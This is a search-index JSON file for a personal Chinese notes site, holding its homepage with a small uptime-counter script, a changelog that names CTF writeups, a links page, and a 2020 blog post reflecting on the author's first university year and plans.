{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f \u00b6 \u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a15 \u603b\u5b57\u6570\uff1a11781 \u4ee3\u7801\u5757\u884c\u6570\uff1a1144 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"#_1","text":"\u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a15 \u603b\u5b57\u6570\uff1a11781 \u4ee3\u7801\u5757\u884c\u6570\uff1a1144 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"changelog/","text":"\u66f4\u65b0\u8bb0\u5f55 \u00b6 Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u7684\u8f83\u5927\u6539\u52a8\u8bb0\u5f55 Powered by TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; } 2025 \u00b6 2025-02-19 \u00b6 Legacy > Old Blog > \u5143\u80de\u81ea\u52a8\u673a Legacy > Old Blog > \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 Legacy > Old Blog > \u5f00\u7aef \u5220\u9664\u4e86\u4e00\u90e8\u65e0\u7528\u5206\u7c7b\uff0c\u589e\u52a0\u4e86Blog\u3001Legacy\u680f\u76ee 2024 \u00b6 2024-10-22 \u00b6 ZJUCTF 2024 Writeups 2023 \u00b6 2023-10-26 \u00b6 Ethernaut ZJUCTF 2023 Writeup 2023-10-25 \u00b6 Hackergame 2023 Writeup \u53c2\u7167 TonyCrane \u5b8c\u6210\u4e86\u7f51\u7ad9\u7684\u90e8\u7f72","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#_1","text":"Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u7684\u8f83\u5927\u6539\u52a8\u8bb0\u5f55 Powered by TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; }","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#2025","text":"2025-02-19 \u00b6 Legacy > Old Blog > \u5143\u80de\u81ea\u52a8\u673a Legacy > Old Blog > \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 Legacy > Old Blog > \u5f00\u7aef \u5220\u9664\u4e86\u4e00\u90e8\u65e0\u7528\u5206\u7c7b\uff0c\u589e\u52a0\u4e86Blog\u3001Legacy\u680f\u76ee","title":"2025"},{"location":"changelog/#2024","text":"2024-10-22 \u00b6 ZJUCTF 2024 Writeups","title":"2024"},{"location":"changelog/#2023","text":"2023-10-26 \u00b6 Ethernaut ZJUCTF 2023 Writeup 2023-10-25 \u00b6 Hackergame 2023 Writeup \u53c2\u7167 TonyCrane \u5b8c\u6210\u4e86\u7f51\u7ad9\u7684\u90e8\u7f72","title":"2023"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"blog/","text":"","title":"Index"},{"location":"legacy/","text":"Legacy \u00b6 Abstract \u4eba\u4eec\u5f80\u5f80\u5584\u4e8e\u6316\u5751\uff0c\u5374\u4e0d\u5584\u4e8e\u586b\u5751\uff0c\u6211\u4ea6\u5982\u6b64\u3002 \u8fd9\u91cc\u57cb\u846c\u8fd9\u4e00\u4e9b\u8fc7\u53bb\uff0c\u6216\u4e3a\u73cd\u5b9d\uff0c\u6216\u4e3a\u7834\u70c2\u3002 \u514d\u8d23\u58f0\u660e\uff1a\u6b64\u5904\u5185\u5bb9\u4e0e\u5f53\u4e0b\u672c\u4eba\u65e0\u5173 O(\u2229_\u2229)O Table of Contents \u00b6 Learning \u5f00\u7aef 1251 4 mins 1739977430 \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 1479 5 mins 1739977430 \u5143\u80de\u81ea\u52a8\u673a 1037 54 4 mins 1739977430 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Legacy"},{"location":"legacy/#legacy","text":"Abstract \u4eba\u4eec\u5f80\u5f80\u5584\u4e8e\u6316\u5751\uff0c\u5374\u4e0d\u5584\u4e8e\u586b\u5751\uff0c\u6211\u4ea6\u5982\u6b64\u3002 \u8fd9\u91cc\u57cb\u846c\u8fd9\u4e00\u4e9b\u8fc7\u53bb\uff0c\u6216\u4e3a\u73cd\u5b9d\uff0c\u6216\u4e3a\u7834\u70c2\u3002 \u514d\u8d23\u58f0\u660e\uff1a\u6b64\u5904\u5185\u5bb9\u4e0e\u5f53\u4e0b\u672c\u4eba\u65e0\u5173 O(\u2229_\u2229)O","title":"Legacy"},{"location":"legacy/#table-of-contents","text":"Learning \u5f00\u7aef 1251 4 mins 1739977430 \u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 1479 5 mins 1739977430 \u5143\u80de\u81ea\u52a8\u673a 1037 54 4 mins 1739977430 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"legacy/old_blog/20200309/","text":"\u5f00\u7aef \u00b6 \u7ea6 1247 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f Abstract \u672c\u6587\u4e8e2020\u5e743\u67089\u65e5\u64b0\u5199\u5728\u8001\u535a\u5ba2\uff0c\u73b0\u91cd\u65b0\u6574\u7406\u6536\u5f55\u4e8e\u6b64\u3002 \u4e00\u5207\u7684\u5f00\u7aef \u00b6 \u679c\u7136\u6211\u6d3b\u7684\u6beb\u65e0\u89c4\u5f8b\u548c\u7ae0\u6cd5\uff0c\u56e0\u4e3a\u4eca\u6668\u7684\u4e00\u65f6\u5174\u8d77\u5c31\u642d\u5efa\u4e86\u8fd9\u4e00\u4e2aBlog\uff0c\u5e76\u4e0d\u662f\u75b2\u4e8e\u7f51\u8bfe\uff08\u6b63\u662f\u800c\u95f2\u5f97\u65e0\u804a\u800c\u73a9\u4e86\u8d77\u6765\u3002\u867d\u7136\u8bf4\u662f\u5076\u7136\u56e0\u7d20\u9020\u6210\uff0c\u4f46\u7a76\u5176\u6839\u672c\u6216\u8bb8\u662f\u524d\u4e9b\u65e5\u5b50\u3001\u4e5f\u5c31\u662f\u4e4b\u524d\u7684\u534a\u5e74\u6d3b\u5f97\u6709\u4e9b\u6d51\u6d51\u5669\u5669\u4e86\u5427\u3002\u597d\u5427\uff0c\u6211\u5c31\u6b64\u53cd\u601d\u8fc7\u9519\uff0c\u5e76\u5c55\u671b\uff08\u4ec5\u6b64\u800c\u5df2\u4e00\u4e0b\u672a\u6765\u3002 \u5f00\u59cb\u80e1\u8bcc\uff01 \u8fc7\u53bb\u534a\u5e74\u7684\u56de\u987e \u00b6 \u6574\u4e2a\u5927\u4e00\u4e0a\uff0c\u6211\u79c9\u6301\u7740\u9002\u5e94\u7684\u539f\u5219 \uff0c\u5c3d\u53ef\u80fd\u5730\u53bb\u53c2\u4e0e\u4e86\u4e00\u5207\u53ef\u4ee5\u53c2\u4e0e\u7684\u4e8b\u7269\uff0c\u65e0\u8bba\u662f\u5b66\u751f\u7ec4\u7ec7\u3001\u793e\u56e2\u3001\u5404\u7ea7\u6d3b\u52a8\u2026\u2026\u770b\u4f3c\u6574\u65e5\u6beb\u65e0\u7a7a\u6687\u4e4b\u4f59\uff0c\u5b9e\u5219\u5374\u788c\u788c\u65e0\u4e3a\uff0c\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0c\u6216\u8bb8\u662f\u65e0\u6240\u6c42\u800c\u65e0\u6240\u5f97\u3002\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\u5728\u6211\u773c\u4e2d\u7eaf\u4e4e\u6ca1\u6709\u610f\u4e49\uff0c\u4e0d\u8fc7\u662f\u5c06\u4e00\u8fde\u4e32\u7684\u4efb\u52a1\u5c3d\u5168\u529b\u53bb\u66f4\u597d\u7684\u5b8c\u6210\u7f62\u4e86\u3002 \u4ee5\u4e0b\u4fbf\u662f\u6211\u5728\u51ac\u5b66\u671f\u4e4b\u521d\u5199\u4e0b\u7684\u8f83\u4e3a\u91cd\u8981\u7684\u4efb\u52a1\uff0c\u770b\u4f3c\u957f\u957f\u4e00\u4e32\uff0c\u5176\u4e2d\u591a\u5c11\u771f\u6b63\u5bf9\u81ea\u5df1\u4ea7\u751f\u4e86\u5b9e\u8d28\u6027\u6b63\u5411\u7684\u5f71\u54cd\uff0c\u6211\u4e2a\u4eba\u8ba4\u4e3a\u5e94\u5f53\u662f\u5be5\u5be5\u65e0\u51e0\u3002 \u4efb\u52a1\u6e05\u5355 \u2714\u82f1\u8bed\u4f5c\u6587 \u2714\u8fd0\u52a8\u4e0e\u8111\u6570\u636e \u2714\u601d\u4fee\u7814\u7a76\u62a5\u544a \u2714\u82f1\u8bed\u4e66\u8bc4 \u2714\u9a6c\u539f\u8bba\u6587 \u2714\u533b\u5b66\u9057\u4f20\u8bba\u6587 \u2714\u56e2\u5de5\u59d4\u65b0\u665a \u2714\u601d\u4fee\u5c55\u793a\u4f5c\u4e1a \u2714\u9ed1\u767d\u6444\u5f71\u4f5c\u4e1a \u2714\u7f8e\u98df\u63a8\u6587 \u2714\u7ecf\u6d4e\u6cd5\u5408\u540c\u4f5c\u4e1a \u2714\u5de5\u4f5c\u7ec4\u4e3b\u9898\u63a8\u6587 \u2714\u5b66\u6587\u6d3b\u52a8\u63a8\u6587 \u2714\u5cf0\u4f1a\u5e72\u4e8b\u7ade\u9009 \u2714\u82f1\u8bed\u5f71\u8bc4 \u2714\u8fd0\u52a8\u4e0e\u8111\u4e2a\u4eba\u4f5c\u4e1a \u2714\u90e8\u95e8\u5723\u8bde\u5185\u5efa\u7b56\u5212 \u2714\u7ba1\u7406\u6c9f\u901a\u5c0f\u7ec4\u4f5c\u4e1a \u2714\u7ba1\u7406\u6c9f\u901a\u4e2a\u4eba\u4f5c\u4e1a \u2714\u63a8\u6587\u7ec4\u65e5\u5e38\u63a8\u6587 \u2714\u8fc7\u5e74\u4e91\u5cf0\u65b9\u9635\u6392\u7ec3 \u2714\u5fae\u79ef\u5206\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ebf\u4ee3\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ba1\u7406\u6c9f\u901a\u8bfe\u5802\u671f\u672b\u8003\u590d\u4e60 \u2714\u671f\u672b\u590d\u4e60\uff08\u5927\u82f1\u3001\u8fd0\u52a8\u4e0e\u8111\u3001\u5fae\u79ef\u5206\u3001C\u7a0b\u3001\u7ebf\u4ee3\u3001\u601d\u4fee\u3001\u7ecf\u6d4e\u6cd5\uff09 \u603b\u5f97\u6765\u8bf4\uff0c\u5356\u529b\u5212\u6868\uff0c\u539f\u5730\u6253\u8f6c\u3002\u4e0d\u8fc7\u4e5f\u5e76\u975e\u6beb\u65e0\u6536\u83b7\uff0c\u5927\u6982\u4e5f\u660e\u786e\u4e86\u4e8e\u81ea\u5df1\u800c\u8a00\uff0c\u54ea\u4e9b\u4e1c\u897f\u5177\u6709\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\u548c\u91cd\u8981\u6027\u3002\u6709\u559c\u6709\u5fe7\uff0c\u4e0d\u8fc7\u4eba\u4e4b\u5e38\u60c5\uff1b\u60a3\u5f97\u60a3\u5931\uff0c\u4e5f\u56e0\u5fc3\u4e2d\u6709\u7684\u3002 \u5c55\u671b0202\u8fd9\u4e00\u5e74 \u00b6 \u8bfe\u4e1a \u00b6 \u9996\u5148\uff0c\u5f53\u7136\u662f\u6700\u7d27\u8981\uff08\u8981\u547d\u7684\u5b66\u4e1a\u65b9\u9762\uff0c\u7531\u4e8e\u4e0a\u5b66\u671f\u56e0\u8fc7\u591a\u5b66\u5206\u5bfc\u81f4\u7cbe\u529b\u5206\u6563\u800c\u7f8e\u4e2d\u4e0d\u8db3\uff0c\u6240\u4ee5\u8fd9\u5b66\u671f\uff0c\u6211\u5728\u5b66\u5206\u65b9\u9762\u7ed9\u81ea\u5df1\u7559\u6709\u8f83\u5927\u7684\u8c03\u8282\uff08\u73a9\u800d\u7a7a\u95f4\uff0c\u4f46\u662f\u6c34\u8bfe\u53d8\u5c11\uff0c\u5176\u5b9e\u4e5f\u548c\u4e0a\u5b66\u671f\u534a\u65a4\u516b\u4e24\u3002\u603b\u4e4b\uff0c\u4e00\u4e2a\u65b9\u9488\u2014\u2014\u786c\u8bfe\u7a33\u4e00\u624b\uff0c\u6c34\u8bfe\u5077\u4e00\u628a\u3002\u7531\u4e8e\u53cc\u98de\u53f2\u7eb2\u548c\u9a6c\u539f\uff0c\u96be\u514d\u4f1a\u9677\u5165\u9e45\u9888\u7684\u6ce5\u6dd6\uff0c\u5f97\u6ce8\u610f\u7406\u667a\u51b7\u9759\u5730\u809d\u3002\u4fdd\u6301\u7a33\u5b9a\u5427\uff0c\u5176\u4ed6\u4e5f\u5c31\u8fd9\u6837\u3002 \u5bf9\u4e8e\u8f85\u4fee\u4e4b\u7c7b\uff0c\u9274\u4e8e\u8f85\u4fee\u7684\u6beb\u65e0\u5b58\u5728\u611f\uff0c\u51b3\u5b9a\u53bb\u8bd5\u8bd5\u5de5\u9ad8\u73ed\u3002\uff08\u8349\u7387\u5730\u77ac\u95f4\u505a\u51b3\u5b9a \u5de5\u4f5c \u00b6 \u7ec4\u7ec7\u65b9\u9762\uff0c\u5b66\u751f\u4f1a\u7684\u6d3b\u52a8\u7531\u4e8e\u67d0\u4e9b\u4e0d\u53ef\u63a7\u56e0\u7d20\uff08\u9886\u5bfc\u6e05\u5947\u7684\u8111\u56de\u8def\u548c\u538b\u69a8\u76f4\u63a5\u88ab\u53d6\u6d88\uff0c\u4f30\u6478\u7740\u63a5\u4e0b\u6765\u4e5f\u5c31\u662f\u4e00\u4e9b\u5c0f\u63a8\u6587\u5de5\u4f5c\u548c\u7559\u4efb\u5de5\u4f5c\uff0c\u521d\u6b65\u8ba1\u5212\u62d2\u7edd\u7559\u4efb\uff0c\u867d\u7136\u8bf4\u5f53\u4ec1\u4e0d\u8ba9\uff0c\u4f46\u662f\u4eba\u5404\u6709\u5fd7\u5427\u3002\u56e2\u5de5\u59d4\u65b9\u9762\uff0c\u5e94\u8be5\u8fd8\u6709\u4e00\u4e2a\u5ef6\u671f\u7684\u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae\u7684\u9879\u76ee\u548c\u65e5\u5e38\u503c\u73ed\uff0818r/h\u7684\u5ec9\u4ef7\u52b3\u52a8\u529b\uff0c\u4e5f\u4e0d\u7559\u4efb\u3002 \u793e\u56e2\u65b9\u9762\uff0c\u4fbf\u662f\u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2\uff0c\u4e0a\u4e2a\u5b66\u671f\u5f00\u5b66\u7684\u5934\u8111\u4e00\u70ed\u52a0\u5165\u7684orz\u3002\u4e0a\u5b66\u671f\u5185\u8bad\u7684Torch\u3001OpenCV\u65e9\u5df2\u88ab\u629b\u4e4b\u8111\u540e\uff0c\u8fc7\u4e8e\u6c34\u7684\u540e\u679c\u5c31\u662f\u8fd9\u5b66\u671f\u7684\u70b8\u88c2\u3002\u61a8\u61a8\u5982\u6211\uff0c\u9519\u8fc7\u4f8b\u4f1a\u88ab\u81ea\u52a8\u5206\u914d\u4efb\u52a1\uff0c\u7adf\u7136\u662f\u6211\u4ece\u672a\u63a5\u89e6\u8fc7\u7684\u6811\u8393\u6d3e/STM32\u3002\u6682\u4e14\u5148\u81ea\u5b66\u7740\u5427\uff0c\u53cd\u6b63\u662f\u793e\u56e2\uff0c\u5927\u4e0d\u4e86\u5495\u5495\u5495\uff08\u9003\u3002 \u5de5\u4f5c\u8ba1\u5212 \u4e91\u5cf0\u5b66\u751f\u4f1a \u7559\u4efb\u5de5\u4f5c \u65e5\u5e38\u63a8\u6587 \u56e2\u5de5\u59d4 \u65e5\u5e38\u503c\u73ed \u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae \u7559\u4efb \u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2 \u590d\u4e60\u5185\u8bad\u5185\u5bb9 Matplotlib Numpy Torch OpenCV \u5b8c\u6210\u6811\u8393\u6d3e/STM32\u63a8\u6587 \u505a\u5c0f\u7ec4\u9879\u76ee \u4e1a\u4f59 \u00b6 \u975e\u9893\u5e9f\u4e4b\u4e8b \u00b6 \u8fd9\u4e00\u7c7b\u4e8b\u60c5\u5c31\u662f\u90a3\u79cd\u8ba1\u5212\u548c\u5b8c\u6210\u6bd4\u5de8\u9ad8\u7684\uff0c\u6bcf\u6b21\u90fd\u4ee4\u81ea\u5df1\u61ca\u6094\u7684\u3002\u867d\u7136\u5982\u6b64\uff0c\u8ba1\u5212\u8fd8\u662f\u8981\u6709\u7684 TODO IMPORTANCE DS \u4e2d TOEFL \u9ad8 Blog \u4f4e Project \u4f4e Reading \u4e2d \u5815\u843d\u5427 \u00b6 \u867d\u7136\u662f\u4e00\u70b9\u7a7a\u865a\u7684\u5feb\u4e50\uff0c\u4f46\u662f\u4e5f\u662f\u4eba\u751f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5185\u5bb9\uff0c\u5728\u60c5\u611f\u4e0a\u5177\u6709\u66f4\u9ad8\u7684\u4ef7\u503c\u548c\u610f\u4e49\u5427\u3002 \u4f19\u4f34\u90ca\u6e38 \u534a\u591c\u72c2\u6b22 \u3002\u3002\u3002\uff08\u597d\u53ed\uff0c\u60f3\u4e0d\u51fa\u6765\u4e86\uff0c\u53cd\u6b63high\u5c31\u5bf9\u4e86\uff09 \u5199\u5728\u6587\u672b \u00b6 \u788e\u788e\u5ff5\u4e86\u8fd9\u4e48\u4e45\uff0c\u4e5f\u4e0d\u77e5\u4e91\u4e91 \u4e3b\u8981\u662f\u642d\u5efa\u4e86\u4e00\u4e2aBlog\uff0c\u603b\u4e0d\u80fd\u8ba9\u5b83\u7a7a\u7a7a\u5982\u4e5f\uff0c\u6240\u4ee5\u5c31\u4e92\u62fc\u4e71\u51d1\u5730\u5148\u5199\u4e00\u7bc7\u6491\u6491\u573a\u9762\uff0c\u8fd8\u5f97Blog\u8981\u7d20\u5168\u4e86\u3002\u54c8\u54c8\u54c8\uff01 \u7adf\u7136\u5199\u4e86\u90a3\u4e48\u4e45\uff0c\u4e3b\u8981\u4e2d\u95f4\u5404\u79cd\u4e8b\u60c5\u5c42\u51fa\u4e0d\u7a77\uff0c\u5207\u8bb0\uff0c\u4e00\u5fc3\u4e0d\u53ef\u591a\u7528\u554a\uff01 2020.3.9 21:45","title":"\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_1","text":"\u7ea6 1247 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f Abstract \u672c\u6587\u4e8e2020\u5e743\u67089\u65e5\u64b0\u5199\u5728\u8001\u535a\u5ba2\uff0c\u73b0\u91cd\u65b0\u6574\u7406\u6536\u5f55\u4e8e\u6b64\u3002","title":"\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_2","text":"\u679c\u7136\u6211\u6d3b\u7684\u6beb\u65e0\u89c4\u5f8b\u548c\u7ae0\u6cd5\uff0c\u56e0\u4e3a\u4eca\u6668\u7684\u4e00\u65f6\u5174\u8d77\u5c31\u642d\u5efa\u4e86\u8fd9\u4e00\u4e2aBlog\uff0c\u5e76\u4e0d\u662f\u75b2\u4e8e\u7f51\u8bfe\uff08\u6b63\u662f\u800c\u95f2\u5f97\u65e0\u804a\u800c\u73a9\u4e86\u8d77\u6765\u3002\u867d\u7136\u8bf4\u662f\u5076\u7136\u56e0\u7d20\u9020\u6210\uff0c\u4f46\u7a76\u5176\u6839\u672c\u6216\u8bb8\u662f\u524d\u4e9b\u65e5\u5b50\u3001\u4e5f\u5c31\u662f\u4e4b\u524d\u7684\u534a\u5e74\u6d3b\u5f97\u6709\u4e9b\u6d51\u6d51\u5669\u5669\u4e86\u5427\u3002\u597d\u5427\uff0c\u6211\u5c31\u6b64\u53cd\u601d\u8fc7\u9519\uff0c\u5e76\u5c55\u671b\uff08\u4ec5\u6b64\u800c\u5df2\u4e00\u4e0b\u672a\u6765\u3002 \u5f00\u59cb\u80e1\u8bcc\uff01","title":"\u4e00\u5207\u7684\u5f00\u7aef"},{"location":"legacy/old_blog/20200309/#_3","text":"\u6574\u4e2a\u5927\u4e00\u4e0a\uff0c\u6211\u79c9\u6301\u7740\u9002\u5e94\u7684\u539f\u5219 \uff0c\u5c3d\u53ef\u80fd\u5730\u53bb\u53c2\u4e0e\u4e86\u4e00\u5207\u53ef\u4ee5\u53c2\u4e0e\u7684\u4e8b\u7269\uff0c\u65e0\u8bba\u662f\u5b66\u751f\u7ec4\u7ec7\u3001\u793e\u56e2\u3001\u5404\u7ea7\u6d3b\u52a8\u2026\u2026\u770b\u4f3c\u6574\u65e5\u6beb\u65e0\u7a7a\u6687\u4e4b\u4f59\uff0c\u5b9e\u5219\u5374\u788c\u788c\u65e0\u4e3a\uff0c\u4ece\u67d0\u79cd\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0c\u6216\u8bb8\u662f\u65e0\u6240\u6c42\u800c\u65e0\u6240\u5f97\u3002\u8fd9\u4e48\u591a\u7684\u4e8b\u60c5\u5728\u6211\u773c\u4e2d\u7eaf\u4e4e\u6ca1\u6709\u610f\u4e49\uff0c\u4e0d\u8fc7\u662f\u5c06\u4e00\u8fde\u4e32\u7684\u4efb\u52a1\u5c3d\u5168\u529b\u53bb\u66f4\u597d\u7684\u5b8c\u6210\u7f62\u4e86\u3002 \u4ee5\u4e0b\u4fbf\u662f\u6211\u5728\u51ac\u5b66\u671f\u4e4b\u521d\u5199\u4e0b\u7684\u8f83\u4e3a\u91cd\u8981\u7684\u4efb\u52a1\uff0c\u770b\u4f3c\u957f\u957f\u4e00\u4e32\uff0c\u5176\u4e2d\u591a\u5c11\u771f\u6b63\u5bf9\u81ea\u5df1\u4ea7\u751f\u4e86\u5b9e\u8d28\u6027\u6b63\u5411\u7684\u5f71\u54cd\uff0c\u6211\u4e2a\u4eba\u8ba4\u4e3a\u5e94\u5f53\u662f\u5be5\u5be5\u65e0\u51e0\u3002 \u4efb\u52a1\u6e05\u5355 \u2714\u82f1\u8bed\u4f5c\u6587 \u2714\u8fd0\u52a8\u4e0e\u8111\u6570\u636e \u2714\u601d\u4fee\u7814\u7a76\u62a5\u544a \u2714\u82f1\u8bed\u4e66\u8bc4 \u2714\u9a6c\u539f\u8bba\u6587 \u2714\u533b\u5b66\u9057\u4f20\u8bba\u6587 \u2714\u56e2\u5de5\u59d4\u65b0\u665a \u2714\u601d\u4fee\u5c55\u793a\u4f5c\u4e1a \u2714\u9ed1\u767d\u6444\u5f71\u4f5c\u4e1a \u2714\u7f8e\u98df\u63a8\u6587 \u2714\u7ecf\u6d4e\u6cd5\u5408\u540c\u4f5c\u4e1a 